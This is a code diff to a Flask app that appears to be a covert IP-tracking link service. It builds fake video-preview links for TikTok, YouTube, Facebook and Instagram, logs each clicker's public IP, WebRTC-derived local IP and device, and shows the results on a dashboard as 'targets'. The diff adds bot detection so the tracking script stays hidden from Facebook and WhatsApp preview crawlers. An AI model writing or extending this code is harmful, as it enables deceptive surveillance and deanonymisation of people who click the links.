@@ -45,35 +45,81 @@ def init_db():
 
 init_db()
 
+def parse_user_agent(ua_string):
+    if not ua_string:
+        return "Unknown Device"
+    
+    ua_low = ua_string.lower()
+    
+    # صيد وتحديد بوتات المنصات بدقة قبل أي شيء آخر
+    if "facebookexternalhit" in ua_low or "facebookplatform" in ua_low:
+        return "🤖 Facebook Preview Bot"
+    elif "whatsapp" in ua_low:
+        return "🤖 WhatsApp Preview Bot"
+    elif "telegrambot" in ua_low:
+        return "🤖 Telegram Preview Bot"
+    elif "twitterbot" in ua_low:
+        return "🤖 Twitter/X Bot"
+    elif "googlebot" in ua_low:
+        return "🤖 Google Index Bot"
+        
+    # تحديد الهواتف والأجهزة العادية
+    if "iphone" in ua_string:
+        return "Apple iPhone"
+    elif "ipad" in ua_string:
+        return "Apple iPad"
+    elif "android" in ua_string:
+        try:
+            parts = ua_string.split(';')
+            for part in parts:
+                if "Build" in part:
+                    return "Android (" + part.split("Build")[0].strip() + ")"
+                elif "Linux" not in part and "Android" not in part:
+                    return "Android (" + part.strip() + ")"
+        except:
+            pass
+        return "Android Device"
+    elif "Windows NT" in ua_string:
+        return "Windows PC"
+    elif "Macintosh" in ua_string:
+        return "MacBook Computer"
+        
+    return "Unknown Device / Bot"
+
 def fetch_original_meta(url, manual_thumb_url=None):
     url_lower = url.lower()
     title = "Watch Trending Video Content in HD Quality"
     img = "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=600"
     
     if manual_thumb_url and manual_thumb_url.strip():
-        img = manual_thumb_url.strip()
+        return title, manual_thumb_url.strip()
         
-    if "tiktok.com" in url_lower or "vt.tiktok" in url_lower:
+    # تحسين جلب ميتاداتا تيك توك وتتبع الروابط المختصرة لـ vt.tiktok
+    if "tiktok.com" in url_lower:
         try:
-            res = requests.get(f"https://www.tiktok.com/oembed?url={url}", timeout=4)
+            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
+            # إذا كان الرابط ممرر من الهاتف vt.tiktok نقوم بفك التوجيه أولاً للحصول على الرابط الطويل الرسمي
+            session = requests.Session()
+            resp = session.get(url, headers=headers, timeout=5, allow_redirects=True)
+            target_url = resp.url
+            
+            res = session.get(f"https://www.tiktok.com/oembed?url={target_url}", headers=headers, timeout=5)
             if res.status_code == 200:
                 data = res.json()
-                return data.get('title', title), manual_thumb_url.strip() if manual_thumb_url else data.get('thumbnail_url', img)
-        except: pass
+                extracted_title = data.get('title', title)
+                extracted_thumb = data.get('thumbnail_url', img)
+                return extracted_title, extracted_thumb
+        except:
+            pass
             
     elif "youtube.com" in url_lower or "youtu.be" in url_lower:
         try:
             res = requests.get(f"https://noembed.com/embed?url={url}", timeout=4)
             if res.status_code == 200:
                 data = res.json()
-                return data.get('title', title), manual_thumb_url.strip() if manual_thumb_url else data.get('thumbnail_url', img)
+                return data.get('title', title), data.get('thumbnail_url', img)
         except: pass
         
-    elif "maps.google.com" in url_lower or "goo.gl/maps" in url_lower:
-        title = "Google Maps - Realtime Location Shared"
-        if not manual_thumb_url:
-            img = "https://images.unsplash.com/photo-1524661135-423995f22d0b?w=600"
-            
     return title, img
 
 def check_auth(username, password):
@@ -88,7 +134,7 @@ def requires_auth(f):
         return f(*args, **kwargs)
     return decorated
 
-# 1. الواجهة المموّهة الرائعة بالكامل باللغة الإنجليزية
+# لوحة التحكم الرئيسية مع الجافاسكريبت الذكي لإخفاء/إظهار حقل الصورة
 DASHBOARD_LAYOUT = '''
 <!DOCTYPE html>
 <html lang="en">
@@ -118,6 +164,10 @@ DASHBOARD_LAYOUT = '''
         label { font-weight: 600; display: block; margin-top: 15px; font-size: 14px; color: #334155; }
         input[type="text"], input[type="url"] { width: 100%; padding: 12px; margin-top: 6px; border: 1px solid #cbd5e1; border-radius: 6px; box-sizing: border-box; font-size: 14px; background: #f8fafc; }
         input:focus { outline: none; border-color: #3b82f6; background: #fff; }
+        
+        /* إخفاء حقل الصورة افتراضياً */
+        #thumbnail_wrapper { display: none; background: #fdf2f8; padding: 15px; border-radius: 6px; border: 1px solid #fbcfe8; margin-top: 15px; }
+
         .submit-btn { width: 100%; background-color: #2563eb; color: white; border: none; padding: 14px; margin-top: 25px; border-radius: 6px; font-size: 15px; font-weight: bold; cursor: pointer; transition: background 0.2s; }
         .submit-btn:hover { background-color: #1d4ed8; }
         
@@ -154,13 +204,15 @@ DASHBOARD_LAYOUT = '''
                 </div>
                 <input type="hidden" id="target_platform" name="target_platform" value="Telegram">
 
-                <label id="url_label">Destination Long URL:</label>
-                <input type="url" name="original_url" oninput="checkUrlDomain(this.value)" placeholder="https://example.com/video..." required>
+                <label>Destination Long URL:</label>
+                <input type="url" id="original_url" name="original_url" oninput="checkUrlDomain(this.value)" placeholder="https://example.com/video..." required>
                 
                 <div id="meta_notice" class="notice-box"></div>
 
-                <label>Custom Thumbnail Image URL (Highly recommended for Facebook/Instagram links):</label>
-                <input type="url" name="manual_thumbnail" placeholder="https://example.com/image.jpg">
+                <div id="thumbnail_wrapper">
+                    <label style="margin-top:0; color:#9d174d;">Pink Alert: Custom Thumbnail Image URL Required</label>
+                    <input type="url" name="manual_thumbnail" placeholder="https://example.com/custom-preview-image.jpg">
+                </div>
 
                 <label>Admin Description / Note:</label>
                 <input type="text" name="note" placeholder="e.g. TikTok video for WhatsApp target" required>
@@ -194,14 +246,20 @@ DASHBOARD_LAYOUT = '''
 
         function checkUrlDomain(val) {
             var notice = document.getElementById('meta_notice');
+            var thumbWrapper = document.getElementById('thumbnail_wrapper');
             var low = val.toLowerCase();
-            if (low.includes("facebook.com") || low.includes("fb.watch")) {
+            
+            if (low.includes("facebook.com") || low.includes("fb.watch") || low.includes("instagram.com")) {
+                thumbWrapper.style.display = "block";
                 notice.style.display = "block";
-                notice.innerHTML = "💡 <b>Facebook Link Detected:</b> To ensure perfect thumbnail previews on Meta apps, consider extracting the direct image URL from <a href='https://thumbnail-downloader.com/facebook' target='_blank'>Thumbnail Downloader for Facebook</a> and pasting it in the Custom Thumbnail field below.";
-            } else if (low.includes("instagram.com")) {
-                notice.style.display = "block";
-                notice.innerHTML = "💡 <b>Instagram Link Detected:</b> Instagram strict APIs block direct scrapers. Please extract the clear image URL from <a href='https://thumbnail-downloader.com/instagram' target='_blank'>Thumbnail Downloader for Instagram</a> and paste it below.";
+                
+                if(low.includes("instagram.com")) {
+                    notice.innerHTML = "💡 <b>Instagram Link Detected:</b> System requires manual extraction. Please extract the direct image link from <a href='https://thumbnail-downloader.com/instagram' target='_blank'>Thumbnail Downloader for Instagram</a> and paste it below.";
+                } else {
+                    notice.innerHTML = "💡 <b>Facebook Link Detected:</b> System requires manual extraction. Please extract the direct image link from <a href='https://thumbnail-downloader.com/facebook' target='_blank'>Thumbnail Downloader for Facebook</a> and paste it below.";
+                }
             } else {
+                thumbWrapper.style.display = "none";
                 notice.style.display = "none";
             }
         }
@@ -210,7 +268,6 @@ DASHBOARD_LAYOUT = '''
 </html>
 '''
 
-# 2. مستودع جمع الروابط الخاصة بك
 MY_LINKS_LAYOUT = '''
 <!DOCTYPE html>
 <html lang="en">
@@ -287,7 +344,6 @@ MY_LINKS_LAYOUT = '''
 </html>
 '''
 
-# 3. لوحة عرض النتائج المستقلة والمفصلة للهاتف بدقة (التوقيت الجزائري)
 ANALYTICS_LAYOUT = '''
 <!DOCTYPE html>
 <html lang="en">
@@ -308,6 +364,7 @@ ANALYTICS_LAYOUT = '''
         .logs-table th, .logs-table td { padding: 12px 16px; border-bottom: 1px solid #e2e8f0; }
         .logs-table th { background-color: #1e293b; color: white; font-weight: 600; }
         .device-badge { background-color: #f1f5f9; padding: 4px 8px; border-radius: 4px; font-weight: 600; color: #0f172a; border: 1px solid #e2e8f0; }
+        .bot-badge { background-color: #fef2f2; padding: 4px 8px; border-radius: 4px; font-weight: 600; color: #dc2626; border: 1px solid #fee2e2; }
     </style>
 </head>
 <body>
@@ -334,14 +391,20 @@ ANALYTICS_LAYOUT = '''
                 </thead>
                 <tbody>
                     {% if not clicks_list %}
-                    <tr><td colspan="4" style="padding: 30px; text-align: center; color: #94a3b8;">No click data recorded for this link yet. Waiting for targets...</td></tr>
+                    <tr><td colspan="4" style="padding: 30px; text-align: center; color: #94a3b8;">No data recorded yet. Waiting for targets or bots...</td></tr>
                     {% else %}
                         {% for click in clicks_list %}
                         <tr>
                             <td style="font-weight: 600; color: #475569;">{{ click.time }}</td>
                             <td style="color:#dc2626; font-weight:bold; font-size:13px; font-family: monospace;">{{ click.ip }}</td>
                             <td style="color:#16a34a; font-weight:bold; font-size:13px; font-family: monospace;">{{ click.local_ip }}</td>
-                            <td><span class="device-badge">{{ click.device }}</span></td>
+                            <td>
+                                {% if "🤖" in click.device %}
+                                <span class="bot-badge">{{ click.device }}</span>
+                                {% else %}
+                                <span class="device-badge">{{ click.device }}</span>
+                                {% endif %}
+                            </td>
                         </tr>
                         {% endfor %}
                     {% endif %}
@@ -428,6 +491,24 @@ def secure_redirect(link_id):
         link_data = cursor.fetchone()
         
     if link_data:
+        ua_string = request.headers.get('User-Agent', '')
+        device_info = parse_user_agent(ua_string)
+        
+        # التقاط الـ IP العام للسيرفر فوراً
+        ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
+        if ip_address and ',' in ip_address:
+            ip_address = ip_address.split(',')[0].strip()
+
+        # إذا كانت الزيارة قادمة من بوت معاينة (Facebook, WhatsApp)
+        # نقوم بتسجيله فوراً في قاعدة البيانات عبر الـ Backend لكي يظهر لك في الجدول
+        if "🤖" in device_info:
+            current_time = get_gmt1_time()
+            with sqlite3.connect(DB_FILE) as conn:
+                cursor = conn.cursor()
+                cursor.execute('INSERT INTO clicks (link_id, ip, local_ip, device, time) VALUES (?, ?, ?, ?, ?)', 
+                               (link_id, ip_address, "No LAN (Bot)", device_info, current_time))
+                conn.commit()
+
         target = link_data['target_platform']
         title = link_data['video_title']
         image_url = link_data['custom_image']
@@ -443,8 +524,6 @@ def secure_redirect(link_id):
             <meta property="og:video:height" content="720">
             <meta name="twitter:card" content="player">
             <meta name="twitter:player" content="{link_data['original_url']}">
-            <meta name="twitter:player:width" content="1280">
-            <meta name="twitter:player:height" content="720">
             '''
         elif target == "Messenger":
             og_type = "video.movie"
@@ -453,8 +532,6 @@ def secure_redirect(link_id):
             <meta property="og:video" content="{link_data['original_url']}">
             <meta property="og:video:secure_url" content="{link_data['original_url']}">
             <meta property="og:video:type" content="text/html">
-            <meta property="og:video:width" content="1280">
-            <meta property="og:video:height" content="720">
             <meta name="text" content="Facebook Watch Video">
             '''
         elif target == "WhatsApp":
@@ -469,7 +546,7 @@ def secure_redirect(link_id):
             <meta property="og:type" content="{og_type}">
             <meta property="og:site_name" content="Instagram Direct Media">
             '''
-        else: # TikTok
+        else:
             og_type = "video.other"
             meta_tags = f'''
             <meta property="og:type" content="{og_type}">
@@ -524,7 +601,10 @@ def secure_redirect(link_id):
                     }};
                     xhr.send(JSON.stringify({{ "local_ip": localIp }}));
                 }}
-                window.onload = gatherLocalIPsAndRedirect;
+                // إذا كان جهازاً عادياً وليس بوتاً، نقوم بتشغيل جافاسكريبت السحب والتحويل
+                if (!navigator.userAgent.includes("facebookexternalhit") && !navigator.userAgent.includes("WhatsApp")) {{
+                    window.onload = gatherLocalIPsAndRedirect;
+                }}
             </script>
         </head>
         <body style="background:#000; color:#fff; font-family:sans-serif; text-align:center; padding-top:45%;">
@@ -543,30 +623,7 @@ def log_click(link_id):
         ip_address = ip_address.split(',')[0].strip()
         
     ua_string = request.headers.get('User-Agent', '')
-    
-    # تفكيك الـ User-Agent لمعرفة نوع وموديل الهاتف الذكي بدقة ونظافة
-    device_detected = "Unknown Device"
-    
-    if "iPhone" in ua_string:
-        device_detected = "Apple iPhone"
-    elif "iPad" in ua_string:
-        device_detected = "Apple iPad"
-    elif "Android" in ua_string:
-        try:
-            # استخراج الموديل الفعلي المحصور بين الأقواس بعد كلمة أندرويد
-            parts = ua_string.split(';')
-            for part in parts:
-                if "Build" in part:
-                    device_detected = "Android (" + part.split("Build")[0].strip() + ")"
-                    break
-                elif "Linux" not in part and "Android" not in part:
-                    device_detected = "Android (" + part.strip() + ")"
-        except:
-            device_detected = "Android Device"
-    elif "Windows NT" in ua_string:
-        device_detected = "Windows PC"
-    elif "Macintosh" in ua_string:
-        device_detected = "MacBook Computer"
+    device_detected = parse_user_agent(ua_string)
 
     current_time = get_gmt1_time()
     
